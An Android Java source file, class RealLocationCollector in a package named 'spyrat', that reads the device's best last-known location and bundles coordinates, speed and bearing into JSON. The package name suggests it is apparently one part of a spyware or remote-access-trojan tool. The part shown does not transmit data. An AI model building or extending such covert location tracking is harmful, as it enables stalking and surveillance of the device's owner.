package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;

    public RealLocationCollector(Context context) {
        this.context = context;
    }

    public JSONObject getCurrentLocation() {
        JSONObject location = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Starting REAL location collection...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try multiple location providers
            Location bestLocation = null;
            String[] providers = {LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER};
            
            for (String provider : providers) {
                try {
                    if (locationManager != null && locationManager.isProviderEnabled(provider)) {
                        Location loc = locationManager.getLastKnownLocation(provider);
                        if (loc != null) {
                            if (bestLocation == null || loc.getAccuracy() < bestLocation.getAccuracy()) {
                                bestLocation = loc;
                            }
                        }
                    }
                } catch (SecurityException e) {
                    Log.w(TAG, "⚠️ Permission denied for provider: " + provider);
                }
            }
            
            if (bestLocation != null) {
                // USE REAL LOCATION DATA
                try {
                    location.put("latitude", bestLocation.getLatitude());
                    location.put("longitude", bestLocation.getLongitude());
                    location.put("accuracy", bestLocation.getAccuracy());
                    location.put("provider", bestLocation.getProvider());
                    location.put("timestamp", bestLocation.getTime());
                    location.put("altitude", bestLocation.hasAltitude() ? bestLocation.getAltitude() : 0.0);
                    location.put("speed", bestLocation.hasSpeed() ? bestLocation.getSpeed() : 0.0);
                    location.put("bearing", bestLocation.hasBearing() ? bestLocation.getBearing() : 0.0);
                    
                    Log.d(TAG, "✅ REAL Location collected: " + bestLocation.getLatitude() + ", " + bestLocation.getLongitude());
                    Log.d(TAG, "📍 Provider: " + bestLocation.getProvider() + ", Accuracy: " + bestLocation.getAccuracy() + "m");
                } catch (Exception jsonError) {
                    Log.e(TAG, "❌ JSON Error in location data: " + jsonError.getMessage());
                }
                
            } else {
                // No location available
                try {
                    location.put("latitude", -1.0);
                    location.put("longitude", -1.0);
                    location.put("accuracy", -1.0);
                    location.put("provider", "no_provider");
                    location.put("timestamp", System.currentTimeMillis());
                    location.put("altitude", -1.0);
                    location.put("speed", -1.0);
                    location.put("bearing", -1.0);
                    location.put("status", "no_location_data");
                    
                    Log.w(TAG, "⚠️ No location data available - using fallback values");
                } catch (Exception jsonError) {
                    Log.e(TAG, "❌ JSON Error in fallback data: " + jsonError.getMessage());
                }
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            // Better error reporting with try-catch
            try {
                location.put("latitude", -2.0);
                location.put("longitude", -2.0);
                location.put("accuracy", -2.0);
                location.put("provider", "permission_denied");
                location.put("timestamp", System.currentTimeMillis());
                location.put("altitude", -2.0);
                location.put("speed", -2.0);
                location.put("bearing", -2.0);
                location.put("status", "permission_error");
            } catch (Exception jsonError) {
                Log.e(TAG, "❌ JSON Error in permission error: " + jsonError.getMessage());
            }
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Location collection error: " + e.getMessage());
            // Better error reporting with try-catch
            try {
                location.put("latitude", -3.0);
                location.put("longitude", -3.0);
                location.put("accuracy", -3.0);
                location.put("provider", "error");
                location.put("timestamp", System.currentTimeMillis());
                location.put("altitude", -3.0);
                location.put("speed", -3.0);
                location.put("bearing", -3.0);
                location.put("status", "collection_error");
            } catch (Exception jsonError) {
                Log.e(TAG, "❌ JSON Error in collection error: " + jsonError.getMessage());
            }
        }
        
        return location;
    }
}
